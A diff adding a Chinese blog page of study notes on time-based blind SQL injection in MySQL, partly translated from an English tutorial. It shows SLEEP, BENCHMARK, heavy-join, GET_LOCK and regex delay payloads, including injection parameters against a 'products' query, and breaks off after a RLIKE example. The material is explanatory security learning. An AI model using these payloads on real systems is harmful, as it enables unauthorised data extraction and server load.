@@ -1,0 +1,1051 @@
+<!-- Post layout -->
+<!DOCTYPE html>
+<html>
+<head>
+<!-- Introducing the head tag -->
+
+<!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>SQL注入-时间盲注整理 | sueisok</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="SQL注入-时间盲注整理" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Notes,Thoughts and Else" />
+<meta property="og:description" content="Notes,Thoughts and Else" />
+<link rel="canonical" href="http://localhost:4000/blog/sqli-time-based/" />
+<meta property="og:url" content="http://localhost:4000/blog/sqli-time-based/" />
+<meta property="og:site_name" content="sueisok" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-04-16T11:26:08+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="SQL注入-时间盲注整理" />
+<meta name="twitter:site" content="@your_name" />
+<meta name="google-site-verification" content="XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","headline":"SQL注入-时间盲注整理","dateModified":"2020-04-16T11:26:08+08:00","datePublished":"2020-04-16T11:26:08+08:00","url":"http://localhost:4000/blog/sqli-time-based/","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/blog/sqli-time-based/"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/banner.png"}},"description":"Notes,Thoughts and Else","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+<script type="application/ld+json">
+    {
+      "@context": "http://schema.org/",
+      "@type": "Person",
+      "image": /assets/JHON.jpg,
+      "honorificPrefix": "MD.",
+      "name": sueisok,
+      "familyName": Your family name,
+      "honorificSuffix": King,
+      "disambiguatingDescription": Your awesome description,
+      "birthPlace": Your address,
+      "birthDate": Your Date of Birth,
+      "height": XX inches,
+      "gender": Your gender,
+      "memberOf": Your awesome orgranization,
+      "nationality": Your proud nationality,
+      "jobTitle": Your Respectful Position,
+      "knowsAbout": Your awesome Skill,
+      "knowsLanguage": ,
+      "email": ,
+      "url": " http://localhost:4000 ",
+      "test": 
+      "worksFor": {
+        "@type": ,
+        "name": ,
+        "openingHours": ,
+        "priceRange": ,
+        "telephone": ,
+        "image": ,
+        "address": {
+        "@type": ,
+        "addressCountry": ,
+        "addressLocality": ,
+        "addressRegion": 
+         }
+      },
+      "address": {
+        "@type": ,
+        "addressCountry": ,
+        "addressLocality": ,
+        "addressRegion": 
+      },
+      "colleague": [
+        "https://deb108471.dhakaeducationboard.gov.bd",
+        "https://deb113652.dhakaeducationboard.gov.bd",
+        "https://deb110880.dhakaeducationboard.gov.bd"
+      ]
+    }
+</script>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-sclable=0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="description" content="Notes,Thoughts and Else" />
+<meta name="keywords" content="123456" />
+
+<!-- preloader -->
+<link rel="stylesheet" href="http://localhost:4000/assets/css/preloader.css">
+
+<!-- Favicon -->
+<link href="/assets/icon.png" rel="shortcut icon" />
+<link href="/assets/icon.png" rel="apple-touch-icon-precomposed" />
+<!-- Android Lolipop Theme Color -->
+<!-- <meta name="theme-color" content="#1464FB"> -->
+<title>SQL注入-时间盲注整理</title>
+<!-- Baidu statistics -->
+
+<!-- Google Analytics -->
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id="></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', '');
+</script>
+
+
+<!-- Android Lolipop Theme Color -->
+<meta name="theme-color" content=" rgb(122,103,138) ">
+</head>
+<body onload="loaderFunc()" data-spy="scroll" data-target="#toc" data-offset="20">
+
+
+<!-- preloader -->
+<div id="loader" class="loader">
+  <div class="artboard">
+    <div class="square"></div>
+    <div class="path">
+      <div class="small-squares">
+        <div></div>
+        <div></div>
+        <div></div>
+        <div></div>
+        <div></div>
+        <div></div>
+      </div>
+    </div>
+  </div>
+</div>
+<!-- end -->
+
+<!-- Top anchor -->
+<a id="htmlup" name="htmlup"></a>
+<!-- Introduce blog post options -->
+
+<header id="post-header" style="background-color:rgb(122,103,138);">
+  <div class="top-center">
+      <div class="logo">
+          <a href="/" title="my awesome webtitle" style="color: white;">sueisok</a>
+      </div>
+      <nav class="top-nav">
+          <ul>
+              
+                <li><a href="/" style="color: white;">Home</a></li>
+              
+                <li><a href="/tags/" style="color: white;">Tags</a></li>
+              
+                <li><a href="/timeline/" style="color: white;">Timeline</a></li>
+              
+                <li><a href="/about/" style="color: white;">About</a></li>
+              
+                <li><a href="/reLink/" style="color: white;">reLink</a></li>
+              
+          </ul>
+      </nav>
+      <div id="top-boot">
+        <a href="javascript:;" id="boot1" style="display:block;" onclick="document.getElementById('boot-area').style.display='block';document.getElementById('boot1').style.display='none';document.getElementById('boot2').style.display='block';"><img src="/assets/boot_white.png" alt=""></a>
+        <a href="javascript:;" id="boot2" style="display: none;" onclick="document.getElementById('boot-area').style.display='none';document.getElementById('boot1').style.display='block';document.getElementById('boot2').style.display='none';"><img src="/assets/boot_white.png" alt=""></a>
+      </div>
+  </div>
+
+</header>
+
+
+<!-- Introducing the mobile dropdown option -->
+<div id="boot-area">
+    <ul>
+        
+          <a href="/"><li>Home</li></a>
+        
+          <a href="/tags/"><li>Tags</li></a>
+        
+          <a href="/timeline/"><li>Timeline</li></a>
+        
+          <a href="/about/"><li>About</li></a>
+        
+          <a href="/reLink/"><li>reLink</li></a>
+        
+    </ul>
+</div>
+
+<!-- Introducing the blog post style -->
+<!-- Version one garbage -->
+<!-- <div class="wow fadeIn top" data-wow-duration="3.5s" >
+    <span class="wow fadeInUp" data-wow-delay="0.2s">SQL注入-时间盲注整理</span>
+    <span class="wow fadeInUp" data-wow-delay="0.4s"></span>
+    <span class="wow fadeInUp" data-wow-delay="0.4s"></span>
+    <span class="wow fadeInUp" data-wow-delay="0.6s">Author&nbsp;&nbsp;|&nbsp;&nbsp;true</span>
+</div> -->
+
+<!--Version 2 switchable page -->
+
+<div class="post-top" style="background-color:rgb(122,103,138);">
+  <!-- Page width is greater than 800px -->
+  <div class="left-area">
+    
+      <a href="javascript:;" class="btn bounceInLeft animated" onmouseover="showLeft();this.style.color='rgb(122,103,138)';" onmouseout="goneLeft();this.style.color='rgba(0,0,0,.2)';"><</a>
+      <div id="left-tab" style="display:none;"><span class="left-san"></span><span class="left-main" style="color:rgb(122,103,138);"><sapn class="main">No previous page</sapn></span></div>
+    
+  </div>
+  <div class="post-titlearea">
+    <span class="wow fadeInUp" data-wow-delay="0.2s">SQL注入-时间盲注整理</span>
+    <!-- <span class="wow fadeInUp" data-wow-delay="0.4s"></span> -->
+    <!-- <span class="wow fadeInUp" data-wow-delay="0.4s"></span> -->
+    <!-- <span class="wow fadeInUp" data-wow-delay="0.6s">Author&nbsp;&nbsp;|&nbsp;&nbsp;true</span> -->
+  </div>
+  <div class="right-area">
+    
+      <a href="/blog/sqli-trick/" class="btn bounceInRight self-animated" onmouseover="showRight();this.style.color='rgb(122,103,138)';" onmouseout="goneRight();this.style.color='rgba(0,0,0,.2)';">></a>
+      <div id="right-tab" style="display:none;"><span class="right-san"></span><span class="right-main" style="color:rgb(122,103,138);"><sapn class="main">SQL注入-一些小trick</sapn></span></div>
+    
+  </div>
+
+  <!-- Page width is less than 800px -->
+  <div class="post-changearea">
+    
+      <a href="javascript:;" class="leftchange" style="border-right: 1px solid rgb(122,103,138);border-bottom: 2px solid rgb(122,103,138);"><span><br>No previous one</span></a>
+    
+    
+      <a href="/blog/sqli-trick/" class="rightchange" style="border-left: 1px solid rgb(122,103,138);border-bottom: 2px solid rgb(122,103,138);"><span>Next<br><br>SQL注入-一些小trick</span></a>
+    
+  </div>
+</div>
+
+
+<div class="markdown-body fadeInUp animated">
+  
+
+    
+      <div class="postpage-subtitle" style="border-left: 8px solid rgb(122,103,138); border-right: 8px solid rgb(122,103,138)">
+        Time Based
+      </div>
+    
+  
+
+  <!-- Article content -->
+ <ul id="markdown-toc">
+  <li><a href="#一些猜数据库时用到的函数" id="markdown-toc-一些猜数据库时用到的函数">一些猜数据库时用到的函数</a></li>
+  <li><a href="#sleep" id="markdown-toc-sleep">SLEEP</a></li>
+  <li><a href="#benchmark" id="markdown-toc-benchmark">BENCHMARK</a></li>
+  <li><a href="#heavy-query" id="markdown-toc-heavy-query">Heavy Query</a>    <ul>
+      <li><a href="#principle" id="markdown-toc-principle">Principle</a></li>
+      <li><a href="#mysql-or-sql-server" id="markdown-toc-mysql-or-sql-server">MySQL or SQL Server</a></li>
+      <li><a href="#oracle" id="markdown-toc-oracle">Oracle</a></li>
+      <li><a href="#additionnal-information" id="markdown-toc-additionnal-information">Additionnal Information</a></li>
+    </ul>
+  </li>
+  <li><a href="#get_lock" id="markdown-toc-get_lock">GET_LOCK</a></li>
+  <li><a href="#正则表达式" id="markdown-toc-正则表达式">正则表达式</a></li>
+  <li><a href="#insert-和-update-的盲注" id="markdown-toc-insert-和-update-的盲注">insert 和 update 的盲注</a></li>
+  <li><a href="#refer" id="markdown-toc-refer">Refer</a></li>
+</ul>
+
+<p>盲注，经我理解就是在服务端不可以直接返回数据的时候，摸索可以区别服务器执行结果的方法。</p>
+
+<h1 id="一些猜数据库时用到的函数">一些猜数据库时用到的函数</h1>
+
+<p><strong>length(a)</strong></p>
+
+<p>返回a的长度</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; select length(database());
++--------------------+
+| length(database()) |
++--------------------+
+|                  4 |
++--------------------+
+1 row in set (0.00 sec)
+</code></pre></div></div>
+
+<p><strong>left(a,b)</strong></p>
+
+<p>从左侧截取a的前b位</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select left(database(),1);
++--------------------+
+| left(database(),1) |
++--------------------+
+| t                  |
++--------------------+
+1 row in set (0.00 sec)
+</code></pre></div></div>
+
+<p><strong>substr(a,b,c)</strong></p>
+
+<p>截取a，从b开始，长度为c</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; select substr(database(),1,2);
++------------------------+
+| substr(database(),1,2) |
++------------------------+
+| te                     |
++------------------------+
+1 row in set (0.00 sec)
+</code></pre></div></div>
+
+<p><strong>mid(a,b,c)</strong></p>
+
+<p>和substr原理一样</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; select mid(database(),1,2);
++---------------------+
+| mid(database(),1,2) |
++---------------------+
+| te                  |
++---------------------+
+1 row in set (0.00 sec)
+</code></pre></div></div>
+
+<p><strong>ascii(a)</strong></p>
+
+<p>输出a的ascii码如果a是字符串，输出a字符串的第一个字符的ascii码</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; select ascii(substr(database(),2,3));
++-------------------------------+
+| ascii(substr(database(),2,3)) |
++-------------------------------+
+|                           101 |
++-------------------------------+
+1 row in set (0.00 sec)
+</code></pre></div></div>
+
+<p><strong>ord(a)</strong></p>
+
+<p>和ascii原理一样</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; select ord('a');
++----------+
+| ord('a') |
++----------+
+|       97 |
++----------+
+1 row in set (0.00 sec)
+</code></pre></div></div>
+
+<p><strong><a href="https://sueisok.github.io/blog/sqli-trick/#ifexpr1expr2expr3">if</a></strong></p>
+
+<p><strong><a href="https://sueisok.github.io/blog/sqli-trick/#ifnullexpr1expr2">ifnull</a></strong></p>
+
+<p><strong><a href="https://sueisok.github.io/blog/sqli-trick/#eltnstr1str2">elt</a></strong></p>
+
+<p><strong><a href="https://sueisok.github.io/blog/sqli-trick/#fieldstrstr1str2">field</a></strong></p>
+
+<h1 id="sleep">SLEEP</h1>
+
+<p>sleep函数括号里的内容就是时间</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; select sleep(1);
++----------+
+| sleep(1) |
++----------+
+|        0 |
++----------+
+1 row in set (1.00 sec)
+</code></pre></div></div>
+
+<p><strong>判断当前表行数</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; select * from vorname where Vorname = sleep(1);
++---------+------------+-----+
+| Vorname | Nachname   | Alt |
++---------+------------+-----+
+| Lina    | Schneider  |  22 |
+| Lara    | Zhang      |  20 |
+| Patric  | Wang       |  23 |
+| Tobias  | Alexandria |  22 |
++---------+------------+-----+
+4 rows in set, 4 warnings (4.00 sec)
+</code></pre></div></div>
+
+<p><strong>判断数据库位数</strong></p>
+
+<p>把sleep放到if里</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; select if(length(database())=4,sleep(2),null)a;
++------+
+| a    |
++------+
+|    0 |
++------+
+1 row in set (2.00 sec)
+</code></pre></div></div>
+
+<p><strong>逐位猜解数据库名</strong></p>
+
+<p>把if放到sleep里</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; select sleep(if(left(database(),1)='t',1,0))a;
++---+
+| a |
++---+
+| 0 |
++---+
+1 row in set (1.00 sec)
+</code></pre></div></div>
+
+<p>还可以在sleep里做运算(payload来自sqlmap)，3-1=2秒</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; select sleep(3-if(left(database(),1)='t',1,0))a;
++---+
+| a |
++---+
+| 0 |
++---+
+1 row in set (2.00 sec)
+</code></pre></div></div>
+
+<p>同理猜解数据表名，猜解数据等等</p>
+
+<h1 id="benchmark">BENCHMARK</h1>
+
+<p>benchmark是基准的意思，可以由用户指定执行一个sql语句或sql表达式的时间，通过执行大规模次数，获得比较稳定的sql执行时间</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BENCHMARK(count,expr)
+</code></pre></div></div>
+
+<p><strong>count</strong>是执行次数，<strong>exr</strong>是要执行的语句执行一次<strong>sha(1)</strong>时可能微不足道，执行10000000次<strong>sha(1)</strong>的时间就可以造成延时</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; select Alt from vorname where Vorname='Lina' and benchmark(100,sha(1));
+Empty set (0.00 sec)
+
+mysql&gt; select Alt from vorname where Vorname='Lina' and benchmark(10000000,sha(1));
+Empty set (2.72 sec)
+</code></pre></div></div>
+
+<p>可以结合<strong>and短路运算规则</strong>进行时间盲注</p>
+
+<h1 id="heavy-query">Heavy Query</h1>
+
+<p>有的地方会叫<strong>笛卡儿积</strong>或者<strong>多表联合查询</strong></p>
+
+<p>先翻译一篇<a href="https://www.sqlinjection.net/heavy-query/">SQL注入网站的文章</a></p>
+
+<blockquote>
+  <p>Using heavy queries instead of time delays</p>
+</blockquote>
+
+<p>利用大量的查询代替时间延迟</p>
+
+<p>（欸，感觉benchmark也是这个原理，利用大量执行一个sql语句的时间进行延迟</p>
+
+<blockquote>
+  <p>For different reasons, it might happen that it is impossible to use time delay functions or procedures in order to achieve a <a href="https://www.sqlinjection.net/time-based/">classic time delay injection</a>. In these situations, the best option is to simulate it with a <strong>heavy query that will take noticeable time to get executed by the database engine</strong>. This article shows how it can be done and it presents an example for the main DBMS.</p>
+</blockquote>
+
+<p>由于不同的原因，有时不会用延时函数或程序达到经典的延时注入。在这种情况下，最好的方法就是将他与大量查询结合，使得数据库引擎执行时消耗一个可见的时间。这篇文章会展示这是如何做到的，并举一个数据库的例子。</p>
+
+<h2 id="principle">Principle</h2>
+
+<blockquote>
+  <p>The injected query should not rely on user tables since in most cases the attacker will have no information about those yet. Queries presented in the following section rely on system tables. The execution time is essentially caused by the large number of lines returned.</p>
+</blockquote>
+
+<p>大多数情况下，攻击者还没有掌握关于数据库或表的信息，所以查询语句不应该是依赖于数据表的，下面举例的查询依赖于系统数据表，执行时间事实上是大量的执行造成的。</p>
+
+<blockquote>
+  <p>Keep in mind that the time to execute each query presented in this article <strong>can tremendously vary depending on the number of rows</strong> contained or returned by the table (or view). This number can be influenced by many factors like: the permissions of your user, the size of the database, the server performance, etc. You should begin with a query joining 2 tables and slowly increment until you can generate an acceptable delay.</p>
+</blockquote>
+
+<p>需要了解的是，这篇文章举例的执行语句的时间，可能千差万别，取决于行的数量或者返回的表格。这个数可以被许多方面影响：用户的权限、数据库的大小、服务器的性能等等。你应该以两个表的联合语句开始，慢慢增加直到可接受的延时。<img src="../../assets/blog_pic/20200416_sqli_time_based/Heavy-Query-Steps.png" alt="avatar" /></p>
+
+<h2 id="mysql-or-sql-server">MySQL or SQL Server</h2>
+
+<blockquote>
+  <p>Chances are low that you have to use the heavy query approach in MySQL or SQL Server since these DBMS make it relatively easy to inject classic code delays in a vulnerable field. However, it could still happen if, for example, <strong>some function or characters are blacklisted</strong>. Here is an example of heavy query that would work fine on SQL Server and on MySQL (version 5 or more).</p>
+</blockquote>
+
+<p>你不得不使用大量的查询的情况还是很少的，因为MySQL或SQL Sever这样的数据库很容易被经典的延时注入。当然，如果一些函数或字符是黑名单过滤的，这个例子就可以很好得在MySQL和SQL Sever使用（版本需要大于5）</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HEAVY</span> <span class="n">MYSQL</span> <span class="n">QUERY</span><span class="p">.</span>
+<span class="k">SELECT</span> <span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="n">A</span><span class="p">,</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="n">B</span><span class="p">,</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">C</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>In my test environment, the query above returns 594823321 and takes about 10 seconds to execute. Let’s now see how it could be used to identify if a vulnerability is present.</p>
+</blockquote>
+
+<p>在我的实验环境中，以上查询返回结果为594823321，花费10秒，那么来看一下他是怎么确认漏洞是否存在的。</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">MALICIOUS</span> <span class="k">PARAMETER</span><span class="p">.</span>
+<span class="mi">1</span> <span class="k">AND</span> <span class="mi">1</span><span class="o">&gt;</span><span class="p">(</span><span class="k">SELECT</span> <span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="n">A</span><span class="p">,</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="n">B</span><span class="p">,</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">C</span><span class="p">)</span> 
+
+<span class="n">QUERY</span> <span class="k">GENERATED</span><span class="p">.</span>
+<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">products</span> <span class="k">WHERE</span> <span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">AND</span> <span class="mi">1</span><span class="o">&gt;</span><span class="p">(</span><span class="k">SELECT</span> <span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="n">A</span><span class="p">,</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="n">B</span><span class="p">,</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">C</span><span class="p">)</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>If the server response takes more time, a vulnerability is probably present. Otherwise we can conclude the field is safe.</p>
+</blockquote>
+
+<p>如果服务器响应花费了很多时间，那么可能是存在漏洞的，否则你可以得出结论，此处是安全的。</p>
+
+<h2 id="oracle">Oracle</h2>
+
+<blockquote>
+  <p>As explained in the article about <a href="https://www.sqlinjection.net/time-based/">time-based attacks</a>, in most cases you will need to use heavy queries in order to achieve this kind of SQL injection. Below is an example of query that takes a lot of time to be executed in this DBMS.</p>
+</blockquote>
+
+<p>正如这篇文章阐释的，大多数情况下你需要使用大量查询来达到对Oracle数据库的注入。下面就是一个例子，在Oracle中用大量时间来执行查询。</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HEAVY</span> <span class="n">ORACLE</span> <span class="n">QUERY</span><span class="p">.</span>
+<span class="k">SELECT</span> <span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">all_users</span> <span class="n">A</span><span class="p">,</span> <span class="n">all_users</span> <span class="n">B</span><span class="p">,</span> <span class="n">all_users</span> <span class="k">C</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>In my Oracle test environment the query above is executed in no time since <strong>I have very few users</strong>. When I grow the FROM clause to 7 tables it takes about 15 seconds. Let’s now see how it could be integrated in a vulnerable field.</p>
+</blockquote>
+
+<p>在我的Oracle测试环境中，上述的查询如果只有很少的用户时，几乎不花费时间，当我讲FROM增加到7个表时大概花费15秒，那么来看一下在存在漏洞时他是怎么集成的。</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">MALICIOUS</span> <span class="k">PARAMETER</span> <span class="p">(</span><span class="nb">TIME</span><span class="o">-</span><span class="n">BASED</span> <span class="n">INJECTION</span><span class="p">).</span>
+<span class="mi">1</span> <span class="k">AND</span> <span class="mi">1</span><span class="o">&lt;</span><span class="k">SELECT</span> <span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">all_users</span> <span class="n">A</span><span class="p">,</span> <span class="n">all_users</span> <span class="n">B</span><span class="p">,</span> <span class="n">all_users</span> <span class="k">C</span>
+
+<span class="n">QUERY</span> <span class="k">GENERATED</span><span class="p">.</span>
+<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">products</span> <span class="k">WHERE</span> <span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">AND</span> <span class="mi">1</span><span class="o">&lt;</span><span class="k">SELECT</span> <span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">all_users</span> <span class="n">A</span><span class="p">,</span> <span class="n">all_users</span> <span class="n">B</span><span class="p">,</span> <span class="n">all_users</span> <span class="k">C</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>Here again, if the test slows significantly the server response, you can conclude a vulnerability is present in the field.</p>
+</blockquote>
+
+<p>同理，如果测试有明显的响应延迟，你就可以得出结论，此处存在漏洞</p>
+
+<h2 id="additionnal-information">Additionnal Information</h2>
+
+<blockquote>
+  <p>As mentioned in the article about time-based attacks, the heavy query approach will have <strong>noticeable impacts on CPU and server resources usage</strong>. Whenever possible, try to inject a time delay that will not be CPU intensive and stick to standards techniques.</p>
+</blockquote>
+
+<p>正如在延时注入攻击中提到的，大量的查询方式会很显著地占用CPU和服务器资源，如果可能，尝试延时注入时不要大量占用CPU或损坏基础框架。</p>
+
+<blockquote>
+  <p>You must also be aware that <strong>the injected query will most likely be executed only once</strong>. The database optimizer will execute it, store its result and use the returned value(s) when testing the WHERE clause against each record. As you can guess, this is must faster than executing the query each time. It should be mentioned however that the query will not be executed if the optimizer detects that the WHERE clause is always false. To avoid any unexpected results <strong>you should always try to generate a WHERE clause that will be verified for at least one record</strong>.</p>
+</blockquote>
+
+<p>你还应该知道的是，大多数注入语句只会执行一次，数据库优化器会执行他，将他的结果存储起来，当测试WHERE语句时，将结果取出，你可以想象到，这肯定比必须每次执行语句要快。也就是说如果优化器检测到WHERE语句总是错误，就不会执行，为了避免一些想不到的结果，当你确认需要返回结果时，你应该先尝试生成WHERE语句。</p>
+
+<h1 id="get_lock">GET_LOCK</h1>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET_LOCK(str, timeout)
+</code></pre></div></div>
+
+<p>对关键字进行了get_lock,那么再开另一个session再次对关键进行get_lock，就会延时我们指定的时间</p>
+
+<p><strong>SESSION A</strong>上锁，注入时的第一步也是对字段加锁</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; select get_lock('111',10);
++--------------------+
+| get_lock('111',10) |
++--------------------+
+|                  1 |
++--------------------+
+1 row in set (0.01 sec)
+</code></pre></div></div>
+
+<p>再打开一个终端<strong>SESSION B</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; select get_lock('111',5);
++-------------------+
+| get_lock('111',5) |
++-------------------+
+|                 0 |
++-------------------+
+1 row in set (5.00 sec)
+</code></pre></div></div>
+
+<p>可结合<strong>and短路运算规则</strong>进行时间盲注</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select * from vorname where Vorname='Lina' and 1=1 and  get_lock('111',2);
+Empty set (2.00 sec)
+</code></pre></div></div>
+
+<p><strong>限制条件</strong></p>
+
+<p>数据库连接必须是持久连接，这个我还没有实践过，参考参考文章，大概意思就是在数据库<strong>mysql_connect()</strong>到<strong>mysql_close()</strong>之间的生命周期才生效。</p>
+
+<h1 id="正则表达式">正则表达式</h1>
+
+<p>原理是通过大量的正则匹配实现延时，与<strong>benchmark</strong>和前面说的<strong>heavy query</strong>本质相似。</p>
+
+<p>MySQL中有<strong>like</strong>、<strong>rlike</strong>、<strong>regexp</strong>正则可以用来匹配，其中<strong>like</strong>内容是通配符，不是正则；<strong>rlike</strong>和<strong>regexp</strong>内容可以正则。</p>
+
+<p><strong>like</strong></p>
+
+<p>like常用的通配符：%、_、escape</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>通配符</th>
+      <th>用法</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>%</td>
+      <td>匹配0个或任意多个字符</td>
+    </tr>
+    <tr>
+      <td>_</td>
+      <td>匹配任意一个字符</td>
+    </tr>
+    <tr>
+      <td>escape</td>
+      <td>转义字符，可匹配%和_</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>举例</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; select * from vorname where Vorname like 'L%';
++---------+-----------+-----+
+| Vorname | Nachname  | Alt |
++---------+-----------+-----+
+| Lina    | Schneider |  22 |
+| Lara    | Zhang     |  20 |
++---------+-----------+-----+
+2 rows in set (0.00 sec)
+
+mysql&gt; select * from vorname where Vorname like '%L__a%';
++---------+-----------+-----+
+| Vorname | Nachname  | Alt |
++---------+-----------+-----+
+| Lina    | Schneider |  22 |
+| Lara    | Zhang     |  20 |
++---------+-----------+-----+
+2 rows in set (0.00 sec)
+
+mysql&gt; select * from vorname where Vorname not like '%L_r%';
++---------+------------+-----+
+| Vorname | Nachname   | Alt |
++---------+------------+-----+
+| Lina    | Schneider  |  22 |
+| Patric  | Wang       |  23 |
+| Tobias  | Alexandria |  22 |
++---------+------------+-----+
+3 rows in set (0.01 sec)
+</code></pre></div></div>
+
+<p>escape ‘/’ 是指用’/’说明在/后面的字符不是通配符，而是普通符</p>
+
+<p><strong>rlike</strong>、<strong>regexp</strong></p>
+
+<p>返回值为<strong>1</strong>或<strong>0</strong>，常用的通配符.、*、[]、^、$、{n}</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>通配符</th>
+      <th>用法</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>.</td>
+      <td>匹配任意单个字符</td>
+    </tr>
+    <tr>
+      <td>*</td>
+      <td>匹配0个或多个前一个得到的字符</td>
+    </tr>
+    <tr>
+      <td>[]</td>
+      <td>匹配任意一个[]内的字符，[ab]*可匹配空、a、b、或任意由a和b组成的字符串</td>
+    </tr>
+    <tr>
+      <td>^</td>
+      <td>匹配开头，如^s匹配以s或者S开头的字符串</td>
+    </tr>
+    <tr>
+      <td>$</td>
+      <td>匹配结尾，如s$匹配以s结尾的字符串</td>
+    </tr>
+    <tr>
+      <td>{n}</td>
+      <td>匹配前一个字符反复n次</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>举例</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; select "1111111121111122222221234" rlike ".*2.*";
++-------------------------------------------+
+| "1111111121111122222221234" rlike ".*2.*" |
++-------------------------------------------+
+|                                         1 |
++-------------------------------------------+
+1 row in set (0.00 sec)
+
+mysql&gt; select "1111111121111122222221234" regexp ".*12.*";
++--------------------------------------------+
+| "1111111121111122222221234" regexp ".*12.*" |
++--------------------------------------------+
+|                                          1 |
++--------------------------------------------+
+1 row in set (0.00 sec)
+</code></pre></div></div>
+
+<p><strong>构造延时注入</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; select * from vorname where Vorname='Lina' and IF(0,concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',0) and '1'='1';
+Empty set (0.00 sec)
+
